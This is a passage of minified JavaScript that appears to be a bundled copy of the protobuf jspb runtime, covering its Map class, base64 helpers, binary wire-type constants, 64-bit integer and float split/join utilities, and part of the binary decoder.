            Array.prototype.forEach.call(y, m, void 0)
        }
        : function(y, m) {
            for (var S = y.length, G = typeof y == "string" ? y.split("") : y, oe = 0; oe < S; oe++)
                oe in G && m.call(void 0, G[oe], oe, y)
        }
          , F = Array.prototype.map ? function(y, m) {
            return Array.prototype.map.call(y, m, void 0)
        }
        : function(y, m) {
            for (var S = y.length, G = Array(S), oe = typeof y == "string" ? y.split("") : y, be = 0; be < S; be++)
                be in oe && (G[be] = m.call(void 0, oe[be], be, y));
            return G
        }
        ;
        function D(y, m, S) {
            return 2 >= arguments.length ? Array.prototype.slice.call(y, m) : Array.prototype.slice.call(y, m, S)
        }
        function I(y, m, S, G) {
            var oe = "Assertion failed";
            if (S) {
                oe += ": " + S;
                var be = G
            } else
                y && (oe += ": " + y,
                be = m);
            throw Error(oe, be || [])
        }
        function M(y, m, S) {
            for (var G = [], oe = 2; oe < arguments.length; ++oe)
                G[oe - 2] = arguments[oe];
            return y || I("", null, m, G),
            y
        }
        function C(y, m, S) {
            for (var G = [], oe = 2; oe < arguments.length; ++oe)
                G[oe - 2] = arguments[oe];
            typeof y != "string" && I("Expected string but got %s: %s.", [v(y), y], m, G)
        }
        function W(y, m, S) {
            for (var G = [], oe = 2; oe < arguments.length; ++oe)
                G[oe - 2] = arguments[oe];
            Array.isArray(y) || I("Expected array but got %s: %s.", [v(y), y], m, G)
        }
        function k(y, m) {
            for (var S = [], G = 1; G < arguments.length; ++G)
                S[G - 1] = arguments[G];
            throw Error("Failure" + (y ? ": " + y : ""), S)
        }
        function H(y, m, S, G) {
            for (var oe = [], be = 3; be < arguments.length; ++be)
                oe[be - 3] = arguments[be];
            y instanceof m || I("Expected instanceof %s but got %s.", [X(m), X(y)], S, oe)
        }
        function X(y) {
            return y instanceof Function ? y.displayName || y.name || "unknown type name" : y instanceof Object ? y.constructor.displayName || y.constructor.name || Object.prototype.toString.call(y) : y === null ? "null" : typeof y
        }
        function Y(y, m) {
            if (this.c = y,
            this.b = m,
            this.a = {},
            this.arrClean = !0,
            0 < this.c.length) {
                for (y = 0; y < this.c.length; y++) {
                    m = this.c[y];
                    var S = m[0];
                    this.a[S.toString()] = new $(S,m[1])
                }
                this.arrClean = !0
            }
        }
        b("jspb.Map", Y, void 0),
        Y.prototype.g = function() {
            if (this.arrClean) {
                if (this.b) {
                    var y = this.a, m;
                    for (m in y)
                        if (Object.prototype.hasOwnProperty.call(y, m)) {
                            var S = y[m].a;
                            S && S.g()
                        }
                }
            } else {
                for (this.c.length = 0,
                y = _(this),
                y.sort(),
                m = 0; m < y.length; m++) {
                    var G = this.a[y[m]];
                    (S = G.a) && S.g(),
                    this.c.push([G.key, G.value])
                }
                this.arrClean = !0
            }
            return this.c
        }
        ,
        Y.prototype.toArray = Y.prototype.g,
        Y.prototype.Mc = function(y, m) {
            for (var S = this.g(), G = [], oe = 0; oe < S.length; oe++) {
                var be = this.a[S[oe][0].toString()];
                R(this, be);
                var ze = be.a;
                ze ? (M(m),
                G.push([be.key, m(y, ze)])) : G.push([be.key, be.value])
            }
            return G
        }
        ,
        Y.prototype.toObject = Y.prototype.Mc,
        Y.fromObject = function(y, m, S) {
            m = new Y([],m);
            for (var G = 0; G < y.length; G++) {
                var oe = y[G][0]
                  , be = S(y[G][1]);
                m.set(oe, be)
            }
            return m
        }
        ;
        function V(y) {
            this.a = 0,
            this.b = y
        }
        V.prototype.next = function() {
            return this.a < this.b.length ? {
                done: !1,
                value: this.b[this.a++]
            } : {
                done: !0,
                value: void 0
            }
        }
        ,
        typeof Symbol < "u" && (V.prototype[Symbol.iterator] = function() {
            return this
        }
        ),
        Y.prototype.Jb = function() {
            return _(this).length
        }
        ,
        Y.prototype.getLength = Y.prototype.Jb,
        Y.prototype.clear = function() {
            this.a = {},
            this.arrClean = !1
        }
        ,
        Y.prototype.clear = Y.prototype.clear,
        Y.prototype.Cb = function(y) {
            y = y.toString();
            var m = this.a.hasOwnProperty(y);
            return delete this.a[y],
            this.arrClean = !1,
            m
        }
        ,
        Y.prototype.del = Y.prototype.Cb,
        Y.prototype.Eb = function() {
            var y = []
              , m = _(this);
            m.sort();
            for (var S = 0; S < m.length; S++) {
                var G = this.a[m[S]];
                y.push([G.key, G.value])
            }
            return y
        }
        ,
        Y.prototype.getEntryList = Y.prototype.Eb,
        Y.prototype.entries = function() {
            var y = []
              , m = _(this);
            m.sort();
            for (var S = 0; S < m.length; S++) {
                var G = this.a[m[S]];
                y.push([G.key, R(this, G)])
            }
            return new V(y)
        }
        ,
        Y.prototype.entries = Y.prototype.entries,
        Y.prototype.keys = function() {
            var y = []
              , m = _(this);
            m.sort();
            for (var S = 0; S < m.length; S++)
                y.push(this.a[m[S]].key);
            return new V(y)
        }
        ,
        Y.prototype.keys = Y.prototype.keys,
        Y.prototype.values = function() {
            var y = []
              , m = _(this);
            m.sort();
            for (var S = 0; S < m.length; S++)
                y.push(R(this, this.a[m[S]]));
            return new V(y)
        }
        ,
        Y.prototype.values = Y.prototype.values,
        Y.prototype.forEach = function(y, m) {
            var S = _(this);
            S.sort();
            for (var G = 0; G < S.length; G++) {
                var oe = this.a[S[G]];
                y.call(m, R(this, oe), oe.key, this)
            }
        }
        ,
        Y.prototype.forEach = Y.prototype.forEach,
        Y.prototype.set = function(y, m) {
            var S = new $(y);
            return this.b ? (S.a = m,
            S.value = m.g()) : S.value = m,
            this.a[y.toString()] = S,
            this.arrClean = !1,
            this
        }
        ,
        Y.prototype.set = Y.prototype.set;
        function R(y, m) {
            return y.b ? (m.a || (m.a = new y.b(m.value)),
            m.a) : m.value
        }
        Y.prototype.get = function(y) {
            if (y = this.a[y.toString()])
                return R(this, y)
        }
        ,
        Y.prototype.get = Y.prototype.get,
        Y.prototype.has = function(y) {
            return y.toString()in this.a
        }
        ,
        Y.prototype.has = Y.prototype.has,
        Y.prototype.Jc = function(y, m, S, G, oe) {
            var be = _(this);
            be.sort();
            for (var ze = 0; ze < be.length; ze++) {
                var at = this.a[be[ze]];
                m.Va(y),
                S.call(m, 1, at.key),
                this.b ? G.call(m, 2, R(this, at), oe) : G.call(m, 2, at.value),
                m.Ya()
            }
        }
        ,
        Y.prototype.serializeBinary = Y.prototype.Jc,
        Y.deserializeBinary = function(y, m, S, G, oe, be, ze) {
            for (; m.oa() && !m.bb(); ) {
                var at = m.c;
                at == 1 ? be = S.call(m) : at == 2 && (y.b ? (M(oe),
                ze || (ze = new y.b),
                G.call(m, ze, oe)) : ze = G.call(m))
            }
            M(be != null),
            M(ze != null),
            y.set(be, ze)
        }
        ;
        function _(y) {
            y = y.a;
            var m = [], S;
            for (S in y)
                Object.prototype.hasOwnProperty.call(y, S) && m.push(S);
            return m
        }
        function $(y, m) {
            this.key = y,
            this.value = m,
            this.a = void 0
        }
        function z(y) {
            if (8192 >= y.length)
                return String.fromCharCode.apply(null, y);
            for (var m = "", S = 0; S < y.length; S += 8192)
                m += String.fromCharCode.apply(null, D(y, S, S + 8192));
            return m
        }
        var K = {
            "\0": "\\0",
            "\b": "\\b",
            "\f": "\\f",
            "\n": "\\n",
            "\r": "\\r",
            "	": "\\t",
            "\v": "\\x0B",
            '"': '\\"',
            "\\": "\\\\",
            "<": "\\u003C"
        }
          , j = {
            "'": "\\'"
        }
          , ee = {}
          , ie = null;
        function ae(y, m) {
            m === void 0 && (m = 0),
            Pe(),
            m = ee[m];
            for (var S = [], G = 0; G < y.length; G += 3) {
                var oe = y[G]
                  , be = G + 1 < y.length
                  , ze = be ? y[G + 1] : 0
                  , at = G + 2 < y.length
                  , $r = at ? y[G + 2] : 0
                  , ea = oe >> 2;
                oe = (oe & 3) << 4 | ze >> 4,
                ze = (ze & 15) << 2 | $r >> 6,
                $r &= 63,
                at || ($r = 64,
                be || (ze = 64)),
                S.push(m[ea], m[oe], m[ze] || "", m[$r] || "")
            }
            return S.join("")
        }
        function he(y) {
            var m = y.length
              , S = 3 * m / 4;
            S % 3 ? S = Math.floor(S) : "=.".indexOf(y[m - 1]) != -1 && (S = "=.".indexOf(y[m - 2]) != -1 ? S - 2 : S - 1);
            var G = new Uint8Array(S)
              , oe = 0;
            return me(y, function(be) {
                G[oe++] = be
            }),
            G.subarray(0, oe)
        }
        function me(y, m) {
            function S($r) {
                for (; G < y.length; ) {
                    var ea = y.charAt(G++)
                      , nl = ie[ea];
                    if (nl != null)
                        return nl;
                    if (!/^[\s\xa0]*$/.test(ea))
                        throw Error("Unknown base64 encoding at char: " + ea)
                }
                return $r
            }
            Pe();
            for (var G = 0; ; ) {
                var oe = S(-1)
                  , be = S(0)
                  , ze = S(64)
                  , at = S(64);
                if (at === 64 && oe === -1)
                    break;
                m(oe << 2 | be >> 4),
                ze != 64 && (m(be << 4 & 240 | ze >> 2),
                at != 64 && m(ze << 6 & 192 | at))
            }
        }
        function Pe() {
            if (!ie) {
                ie = {};
                for (var y = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), m = ["+/=", "+/", "-_=", "-_.", "-_"], S = 0; 5 > S; S++) {
                    var G = y.concat(m[S].split(""));
                    ee[S] = G;
                    for (var oe = 0; oe < G.length; oe++) {
                        var be = G[oe];
                        ie[be] === void 0 && (ie[be] = oe)
                    }
                }
            }
        }
        b("jspb.ConstBinaryMessage", function() {}, void 0),
        b("jspb.BinaryMessage", function() {}, void 0),
        b("jspb.BinaryConstants.FieldType", {
            yb: -1,
            ee: 1,
            FLOAT: 2,
            ke: 3,
            te: 4,
            je: 5,
            xb: 6,
            wb: 7,
            BOOL: 8,
            re: 9,
            ie: 10,
            le: 11,
            ce: 12,
            se: 13,
            ge: 14,
            me: 15,
            ne: 16,
            oe: 17,
            pe: 18,
            he: 30,
            ve: 31
        }, void 0),
        b("jspb.BinaryConstants.WireType", {
            yb: -1,
            ue: 0,
            xb: 1,
            de: 2,
            qe: 3,
            fe: 4,
            wb: 5
        }, void 0),
        b("jspb.BinaryConstants.FieldTypeToWireType", function(y) {
            switch (y) {
            case 5:
            case 3:
            case 13:
            case 4:
            case 17:
            case 18:
            case 8:
            case 14:
            case 31:
                return 0;
            case 1:
            case 6:
            case 16:
            case 30:
                return 1;
            case 9:
            case 11:
            case 12:
                return 2;
            case 2:
            case 7:
            case 15:
                return 5;
            default:
                return -1
            }
        }, void 0),
        b("jspb.BinaryConstants.INVALID_FIELD_NUMBER", -1, void 0),
        b("jspb.BinaryConstants.FLOAT32_EPS", 1401298464324817e-60, void 0),
        b("jspb.BinaryConstants.FLOAT32_MIN", 11754943508222875e-54, void 0),
        b("jspb.BinaryConstants.FLOAT32_MAX", 34028234663852886e22, void 0),
        b("jspb.BinaryConstants.FLOAT64_EPS", 5e-324, void 0),
        b("jspb.BinaryConstants.FLOAT64_MIN", 22250738585072014e-324, void 0),
        b("jspb.BinaryConstants.FLOAT64_MAX", 17976931348623157e292, void 0),
        b("jspb.BinaryConstants.TWO_TO_20", 1048576, void 0),
        b("jspb.BinaryConstants.TWO_TO_23", 8388608, void 0),
        b("jspb.BinaryConstants.TWO_TO_31", 2147483648, void 0),
        b("jspb.BinaryConstants.TWO_TO_32", 4294967296, void 0),
        b("jspb.BinaryConstants.TWO_TO_52", 4503599627370496, void 0),
        b("jspb.BinaryConstants.TWO_TO_63", 9223372036854776e3, void 0),
        b("jspb.BinaryConstants.TWO_TO_64", 18446744073709552e3, void 0),
        b("jspb.BinaryConstants.ZERO_HASH", "\0\0\0\0\0\0\0\0", void 0);
        var _e = 0
          , Fe = 0;
        b("jspb.utils.getSplit64Low", function() {
            return _e
        }, void 0),
        b("jspb.utils.getSplit64High", function() {
            return Fe
        }, void 0);
        function Je(y) {
            var m = y >>> 0;
            y = Math.floor((y - m) / 4294967296) >>> 0,
            _e = m,
            Fe = y
        }
        b("jspb.utils.splitUint64", Je, void 0);
        function rt(y) {
            var m = 0 > y;
            y = Math.abs(y);
            var S = y >>> 0;
            y = Math.floor((y - S) / 4294967296),
            y >>>= 0,
            m && (y = ~y >>> 0,
            S = (~S >>> 0) + 1,
            4294967295 < S && (S = 0,
            y++,
            4294967295 < y && (y = 0))),
            _e = S,
            Fe = y
        }
        b("jspb.utils.splitInt64", rt, void 0);
        function xt(y) {
            var m = 0 > y;
            y = 2 * Math.abs(y),
            Je(y),
            y = _e;
            var S = Fe;
            m && (y == 0 ? S == 0 ? S = y = 4294967295 : (S--,
            y = 4294967295) : y--),
            _e = y,
            Fe = S
        }
        b("jspb.utils.splitZigzag64", xt, void 0);
        function Tt(y) {
            var m = 0 > y ? 1 : 0;
            if (y = m ? -y : y,
            y === 0)
                0 < 1 / y ? _e = Fe = 0 : (Fe = 0,
                _e = 2147483648);
            else if (isNaN(y))
                Fe = 0,
                _e = 2147483647;
            else if (34028234663852886e22 < y)
                Fe = 0,
                _e = (m << 31 | 2139095040) >>> 0;
            else if (11754943508222875e-54 > y)
                y = Math.round(y / Math.pow(2, -149)),
                Fe = 0,
                _e = (m << 31 | y) >>> 0;
            else {
                var S = Math.floor(Math.log(y) / Math.LN2);
                y *= Math.pow(2, -S),
                y = Math.round(8388608 * y),
                16777216 <= y && ++S,
                Fe = 0,
                _e = (m << 31 | S + 127 << 23 | y & 8388607) >>> 0
            }
        }
        b("jspb.utils.splitFloat32", Tt, void 0);
        function Qe(y) {
            var m = 0 > y ? 1 : 0;
            if (y = m ? -y : y,
            y === 0)
                Fe = 0 < 1 / y ? 0 : 2147483648,
                _e = 0;
            else if (isNaN(y))
                Fe = 2147483647,
                _e = 4294967295;
            else if (17976931348623157e292 < y)
                Fe = (m << 31 | 2146435072) >>> 0,
                _e = 0;
            else if (22250738585072014e-324 > y)
                y /= Math.pow(2, -1074),
                Fe = (m << 31 | y / 4294967296) >>> 0,
                _e = y >>> 0;
            else {
                var S = y
                  , G = 0;
                if (2 <= S)
                    for (; 2 <= S && 1023 > G; )
                        G++,
                        S /= 2;
                else
                    for (; 1 > S && -1022 < G; )
                        S *= 2,
                        G--;
                y *= Math.pow(2, -G),
                Fe = (m << 31 | G + 1023 << 20 | 1048576 * y & 1048575) >>> 0,
                _e = 4503599627370496 * y >>> 0
            }
        }
        b("jspb.utils.splitFloat64", Qe, void 0);
        function Ye(y) {
            var m = y.charCodeAt(4)
              , S = y.charCodeAt(5)
              , G = y.charCodeAt(6)
              , oe = y.charCodeAt(7);
            _e = y.charCodeAt(0) + (y.charCodeAt(1) << 8) + (y.charCodeAt(2) << 16) + (y.charCodeAt(3) << 24) >>> 0,
            Fe = m + (S << 8) + (G << 16) + (oe << 24) >>> 0
        }
        b("jspb.utils.splitHash64", Ye, void 0);
        function Bt(y, m) {
            return 4294967296 * m + (y >>> 0)
        }
        b("jspb.utils.joinUint64", Bt, void 0);
        function Dr(y, m) {
            var S = m & 2147483648;
            return S && (y = ~y + 1 >>> 0,
            m = ~m >>> 0,
            y == 0 && (m = m + 1 >>> 0)),
            y = Bt(y, m),
            S ? -y : y
        }
        b("jspb.utils.joinInt64", Dr, void 0);
        function Cr(y, m, S) {
            var G = m >> 31;
            return S(y << 1 ^ G, (m << 1 | y >>> 31) ^ G)
        }
        b("jspb.utils.toZigzag64", Cr, void 0);
        function se(y, m) {
            return le(y, m, Dr)
        }
        b("jspb.utils.joinZigzag64", se, void 0);
        function le(y, m, S) {
            var G = -(y & 1);
            return S((y >>> 1 | m << 31) ^ G, m >>> 1 ^ G)
        }
        b("jspb.utils.fromZigzag64", le, void 0);
        function Te(y) {
            var m = 2 * (y >> 31) + 1
              , S = y >>> 23 & 255;
            return y &= 8388607,
            S == 255 ? y ? NaN : 1 / 0 * m : S == 0 ? m * Math.pow(2, -149) * y : m * Math.pow(2, S - 150) * (y + Math.pow(2, 23))
        }
        b("jspb.utils.joinFloat32", Te, void 0);
        function Ue(y, m) {
            var S = 2 * (m >> 31) + 1
              , G = m >>> 20 & 2047;
            return y = 4294967296 * (m & 1048575) + y,
            G == 2047 ? y ? NaN : 1 / 0 * S : G == 0 ? S * Math.pow(2, -1074) * y : S * Math.pow(2, G - 1075) * (y + 4503599627370496)
        }
        b("jspb.utils.joinFloat64", Ue, void 0);
        function Re(y, m) {
            return String.fromCharCode(y >>> 0 & 255, y >>> 8 & 255, y >>> 16 & 255, y >>> 24 & 255, m >>> 0 & 255, m >>> 8 & 255, m >>> 16 & 255, m >>> 24 & 255)
        }
        b("jspb.utils.joinHash64", Re, void 0),
        b("jspb.utils.DIGITS", "0123456789abcdef".split(""), void 0);
        function $e(y, m) {
            function S(oe, be) {
                return oe = oe ? String(oe) : "",
                be ? "0000000".slice(oe.length) + oe : oe
            }
            if (2097151 >= m)
                return "" + Bt(y, m);
            var G = (y >>> 24 | m << 8) >>> 0 & 16777215;
            return m = m >> 16 & 65535,
            y = (y & 16777215) + 6777216 * G + 6710656 * m,
            G += 8147497 * m,
            m *= 2,
            1e7 <= y && (G += Math.floor(y / 1e7),
            y %= 1e7),
            1e7 <= G && (m += Math.floor(G / 1e7),
            G %= 1e7),
            S(m, 0) + S(G, m) + S(y, 1)
        }
        b("jspb.utils.joinUnsignedDecimalString", $e, void 0);
        function st(y, m) {
            var S = m & 2147483648;
            return S && (y = ~y + 1 >>> 0,
            m = ~m + (y == 0 ? 1 : 0) >>> 0),
            y = $e(y, m),
            S ? "-" + y : y
        }
        b("jspb.utils.joinSignedDecimalString", st, void 0);
        function yt(y, m) {
            Ye(y),
            y = _e;
            var S = Fe;
            return m ? st(y, S) : $e(y, S)
        }
        b("jspb.utils.hash64ToDecimalString", yt, void 0),
        b("jspb.utils.hash64ArrayToDecimalStrings", function(y, m) {
            for (var S = Array(y.length), G = 0; G < y.length; G++)
                S[G] = yt(y[G], m);
            return S
        }, void 0);
        function vt(y) {
            function m(ze, at) {
                for (var $r = 0; 8 > $r && (ze !== 1 || 0 < at); $r++)
                    at = ze * oe[$r] + at,
                    oe[$r] = at & 255,
                    at >>>= 8
            }
            function S() {
                for (var ze = 0; 8 > ze; ze++)
                    oe[ze] = ~oe[ze] & 255
            }
            M(0 < y.length);
            var G = !1;
            y[0] === "-" && (G = !0,
            y = y.slice(1));
            for (var oe = [0, 0, 0, 0, 0, 0, 0, 0], be = 0; be < y.length; be++)
                m(10, y.charCodeAt(be) - 48);
            return G && (S(),
            m(1, 1)),
            z(oe)
        }
        b("jspb.utils.decimalStringToHash64", vt, void 0),
        b("jspb.utils.splitDecimalString", function(y) {
            Ye(vt(y))
        }, void 0);
        function Z(y) {
            return String.fromCharCode(10 > y ? 48 + y : 87 + y)
        }
        function N(y) {
            return 97 <= y ? y - 97 + 10 : y - 48
        }
        b("jspb.utils.hash64ToHexString", function(y) {
            var m = Array(18);
            m[0] = "0",
            m[1] = "x";
            for (var S = 0; 8 > S; S++) {
                var G = y.charCodeAt(7 - S);
                m[2 * S + 2] = Z(G >> 4),
                m[2 * S + 3] = Z(G & 15)
            }
            return m.join("")
        }, void 0),
        b("jspb.utils.hexStringToHash64", function(y) {
            y = y.toLowerCase(),
            M(y.length == 18),
            M(y[0] == "0"),
            M(y[1] == "x");
            for (var m = "", S = 0; 8 > S; S++)
                m = String.fromCharCode(16 * N(y.charCodeAt(2 * S + 2)) + N(y.charCodeAt(2 * S + 3))) + m;
            return m
        }, void 0),
        b("jspb.utils.hash64ToNumber", function(y, m) {
            Ye(y),
            y = _e;
            var S = Fe;
            return m ? Dr(y, S) : Bt(y, S)
        }, void 0),
        b("jspb.utils.numberToHash64", function(y) {
            return rt(y),
            Re(_e, Fe)
        }, void 0),
        b("jspb.utils.countVarints", function(y, m, S) {
            for (var G = 0, oe = m; oe < S; oe++)
                G += y[oe] >> 7;
            return S - m - G
        }, void 0),
        b("jspb.utils.countVarintFields", function(y, m, S, G) {
            var oe = 0;
            if (G *= 8,
            128 > G)
                for (; m < S && y[m++] == G; )
                    for (oe++; ; ) {
                        var be = y[m++];
                        if ((be & 128) == 0)
                            break
                    }
            else
                for (; m < S; ) {
                    for (be = G; 128 < be; ) {
                        if (y[m] != (be & 127 | 128))
                            return oe;
                        m++,
                        be >>= 7
                    }
                    if (y[m++] != be)
                        break;
                    for (oe++; be = y[m++],
                    (be & 128) != 0; )
                        ;
                }
            return oe
        }, void 0);
        function U(y, m, S, G, oe) {
            var be = 0;
            if (128 > G)
                for (; m < S && y[m++] == G; )
                    be++,
                    m += oe;
            else
                for (; m < S; ) {
                    for (var ze = G; 128 < ze; ) {
                        if (y[m++] != (ze & 127 | 128))
                            return be;
                        ze >>= 7
                    }
                    if (y[m++] != ze)
                        break;
                    be++,
                    m += oe
                }
            return be
        }
        b("jspb.utils.countFixed32Fields", function(y, m, S, G) {
            return U(y, m, S, 8 * G + 5, 4)
        }, void 0),
        b("jspb.utils.countFixed64Fields", function(y, m, S, G) {
            return U(y, m, S, 8 * G + 1, 8)
        }, void 0),
        b("jspb.utils.countDelimitedFields", function(y, m, S, G) {
            var oe = 0;
            for (G = 8 * G + 2; m < S; ) {
                for (var be = G; 128 < be; ) {
                    if (y[m++] != (be & 127 | 128))
                        return oe;
                    be >>= 7
                }
                if (y[m++] != be)
                    break;
                oe++;
                for (var ze = 0, at = 1; be = y[m++],
                ze += (be & 127) * at,
                at *= 128,
                (be & 128) != 0; )
                    ;
                m += ze
            }
            return oe
        }, void 0),
        b("jspb.utils.debugBytesToTextFormat", function(y) {
            var m = '"';
            if (y) {
                y = ne(y);
                for (var S = 0; S < y.length; S++)
                    m += "\\x",
                    16 > y[S] && (m += "0"),
                    m += y[S].toString(16)
            }
            return m + '"'
        }, void 0),
        b("jspb.utils.debugScalarToTextFormat", function(y) {
            if (typeof y == "string") {
                y = String(y);
                for (var m = ['"'], S = 0; S < y.length; S++) {
                    var G = y.charAt(S), oe = G.charCodeAt(0), be = S + 1, ze;
                    (ze = K[G]) || (31 < oe && 127 > oe || (oe = G,
                    oe in j ? G = j[oe] : oe in K ? G = j[oe] = K[oe] : (ze = oe.charCodeAt(0),
                    31 < ze && 127 > ze ? G = oe : (256 > ze ? (G = "\\x",
                    (16 > ze || 256 < ze) && (G += "0")) : (G = "\\u",
                    4096 > ze && (G += "0")),
                    G += ze.toString(16).toUpperCase()),
                    G = j[oe] = G)),
                    ze = G),
                    m[be] = ze
                }
                m.push('"'),
                y = m.join("")
            } else
                y = y.toString();
            return y
        }, void 0),
        b("jspb.utils.stringToByteArray", function(y) {
            for (var m = new Uint8Array(y.length), S = 0; S < y.length; S++) {
                var G = y.charCodeAt(S);
                if (255 < G)
                    throw Error("Conversion error: string contains codepoint outside of byte range");
                m[S] = G
            }
            return m
        }, void 0);
        function ne(y) {
            return y.constructor === Uint8Array ? y : y.constructor === ArrayBuffer ? new Uint8Array(y) : y.constructor === Array ? new Uint8Array(y) : y.constructor === String ? he(y) : y instanceof Uint8Array ? new Uint8Array(y.buffer,y.byteOffset,y.byteLength) : (k("Type not convertible to Uint8Array."),
            new Uint8Array(0))
        }
        b("jspb.utils.byteSourceToUint8Array", ne, void 0);
        function J(y, m, S) {
            this.b = null,
            this.a = this.c = this.h = 0,
            this.v = !1,
            y && this.H(y, m, S)
        }
        b("jspb.BinaryDecoder", J, void 0);
        var Ee = [];
        J.getInstanceCacheLength = function() {
            return Ee.length
        }
        ;
        function Ie(y, m, S) {
            if (Ee.length) {
                var G = Ee.pop();
                return y && G.H(y, m, S),
                G
            }
            return new J(y,m,S)
        }
        J.alloc = Ie,
        J.prototype.Ca = function() {
            this.clear(),
            100 > Ee.length && Ee.push(this)
        }
        ,
        J.prototype.free = J.prototype.Ca,
        J.prototype.clone = function() {
            return Ie(this.b, this.h, this.c - this.h)
        }
        ,
        J.prototype.clone = J.prototype.clone,
        J.prototype.clear = function() {
            this.b = null,
            this.a = this.c = this.h = 0,
            this.v = !1
        }
        ,
        J.prototype.clear = J.prototype.clear,
        J.prototype.Y = function() {
            return this.b
        }
        ,
        J.prototype.getBuffer = J.prototype.Y,
        J.prototype.H = function(y, m, S) {
            this.b = ne(y),
            this.h = m !== void 0 ? m : 0,
            this.c = S !== void 0 ? this.h + S : this.b.length,
            this.a = this.h
        }
        ,
        J.prototype.setBlock = J.prototype.H,
        J.prototype.Db = function() {
            return this.c
        }
        ,
        J.prototype.getEnd = J.prototype.Db,
        J.prototype.setEnd = function(y) {
            this.c = y
        }
        ,
        J.prototype.setEnd = J.prototype.setEnd,
        J.prototype.reset = function() {
            this.a = this.h
        }
        ,
        J.prototype.reset = J.prototype.reset,
        J.prototype.B = function() {
            return this.a
        }
        ,
        J.prototype.getCursor = J.prototype.B,
        J.prototype.Ma = function(y) {
            this.a = y
        }
        ,
        J.prototype.setCursor = J.prototype.Ma,
        J.prototype.advance = function(y) {
            this.a += y,
            M(this.a <= this.c)
        }
        ,
        J.prototype.advance = J.prototype.advance,
        J.prototype.ya = function() {
            return this.a == this.c
        }
        ,
        J.prototype.atEnd = J.prototype.ya,
        J.prototype.Qb = function() {
            return this.a > this.c
        }
        ,
        J.prototype.pastEnd = J.prototype.Qb,
        J.prototype.getError = function() {
            return this.v || 0 > this.a || this.a > this.c
        }
        ,
        J.prototype.getError = J.prototype.getError,
        J.prototype.w = function(y) {
            for (var m = 128, S = 0, G = 0, oe = 0; 4 > oe && 128 <= m; oe++)
                m = this.b[this.a++],
                S |= (m & 127) << 7 * oe;
            if (128 <= m && (m = this.b[this.a++],
            S |= (m & 127) << 28,
            G |= (m & 127) >> 4),
            128 <= m)
                for (oe = 0; 5 > oe && 128 <= m; oe++)
                    m = this.b[this.a++],
                    G |= (m & 127) << 7 * oe + 3;
            if (128 > m)
                return y(S >>> 0, G >>> 0);
            k("Failed to read varint, encoding is invalid."),
            this.v = !0
        }
        ,
        J.prototype.readSplitVarint64 = J.prototype.w,
        J.prototype.ea = function(y) {
            return this.w(function(m, S) {
                return le(m, S, y)
            })
        }
        ,
        J.prototype.readSplitZigzagVarint64 = J.prototype.ea,
        J.prototype.ta = function(y) {
            var m = this.b
              , S = this.a;
            this.a += 8;
            for (var G = 0, oe = 0, be = S + 7; be >= S; be--)
                G = G << 8 | m[be],
                oe = oe << 8 | m[be + 4];
            return y(G, oe)
        }
        ,
        J.prototype.readSplitFixed64 = J.prototype.ta,
        J.prototype.kb = function() {
            for (; this.b[this.a] & 128; )
                this.a++;
            this.a++
        }
        ,
        J.prototype.skipVarint = J.prototype.kb,
        J.prototype.mb = function(y) {
            for (; 128 < y; )
                this.a--,
                y >>>= 7;
            this.a--
        }
        ,
        J.prototype.unskipVarint = J.prototype.mb,
        J.prototype.o = function() {
            var y = this.b
              , m = y[this.a]
              , S = m & 127;
            return 128 > m ? (this.a += 1,
            M(this.a <= this.c),
            S) : (m = y[this.a + 1],
            S |= (m & 127) << 7,
            128 > m ? (this.a += 2,
            M(this.a <= this.c),
            S) : (m = y[this.a + 2],
            S |= (m & 127) << 14,
            128 > m ? (this.a += 3,
            M(this.a <= this.c),
            S) : (m = y[this.a + 3],
            S |= (m & 127) << 21,
            128 > m ? (this.a += 4,
            M(this.a <= this.c),
            S) : (m = y[this.a + 4],
            S |= (m & 15) << 28,
            128 > m ? (this.a += 5,
            M(this.a <= this.c),
            S >>> 0) : (this.a += 5,
            128 <= y[this.a++] && 128 <= y[this.a++] && 128 <= y[this.a++] && 128 <= y[this.a++] && 128 <= y[this.a++] && M(!1),
            M(this.a <= this.c),
            S)))))
        }
        ,
        J.prototype.readUnsignedVarint32 = J.prototype.o,
        J.prototype.da = function() {
            return ~~this.o()
        }
        ,
        J.prototype.readSignedVarint32 = J.prototype.da,
        J.prototype.O = function() {
            return this.o().toString()
        }
        ,
        J.prototype.Ea = function() {
            return this.da().toString()
        }
        ,
        J.prototype.readSignedVarint32String = J.prototype.Ea,
        J.prototype.Ia = function() {
            var y = this.o();
            return y >>> 1 ^ -(y & 1)
        }
        ,
        J.prototype.readZigzagVarint32 = J.prototype.Ia,
        J.prototype.Ga = function() {
            return this.w(Bt)
        }
        ,
        J.prototype.readUnsignedVarint64 = J.prototype.Ga,
        J.prototype.Ha = function() {
            return this.w($e)
        }
        ,
        J.prototype.readUnsignedVarint64String = J.prototype.Ha,
        J.prototype.sa = function() {
            return this.w(Dr)
        }
        ,
        J.prototype.readSignedVarint64 = J.prototype.sa,
        J.prototype.Fa = function() {
            return this.w(st)
        }
        ,
        J.prototype.readSignedVarint64String = J.prototype.Fa,
        J.prototype.Ja = function() {
            return this.w(se)
        }
        ,
        J.prototype.readZigzagVarint64 = J.prototype.Ja,
        J.prototype.fb = function() {
            return this.ea(Re)
        }
        ,
        J.prototype.readZigzagVarintHash64 = J.prototype.fb,
        J.prototype.Ka = function() {
            return this.ea(st)
        }
        ,
        J.prototype.readZigzagVarint64String = J.prototype.Ka,
        J.prototype.Gc = function() {
            var y = this.b[this.a];
            return this.a += 1,
            M(this.a <= this.c),
            y
        }
        ,
        J.prototype.readUint8 = J.prototype.Gc,
        J.prototype.Ec = function() {
            var y = this.b[this.a]
              , m = this.b[this.a + 1];
            return this.a += 2,
            M(this.a <= this.c),
            y << 0 | m << 8
        }
        ,
        J.prototype.readUint16 = J.prototype.Ec,
        J.prototype.m = function() {
            var y = this.b[this.a]
              , m = this.b[this.a + 1]
              , S = this.b[this.a + 2]
              , G = this.b[this.a + 3];
            return this.a += 4,
            M(this.a <= this.c),
            (y << 0 | m << 8 | S << 16 | G << 24) >>> 0
        }
        ,
        J.prototype.readUint32 = J.prototype.m,
        J.prototype.ga = function() {
            var y = this.m()
              , m = this.m();
            return Bt(y, m)
        }
        ,
        J.prototype.readUint64 = J.prototype.ga,
        J.prototype.ha = function() {
            var y = this.m()
              , m = this.m();
            return $e(y, m)
        }
        ,
        J.prototype.readUint64String = J.prototype.ha,
        J.prototype.Xb = function() {
            var y = this.b[this.a];
            return this.a += 1,
            M(this.a <= this.c),
            y << 24 >> 24
        }
        ,
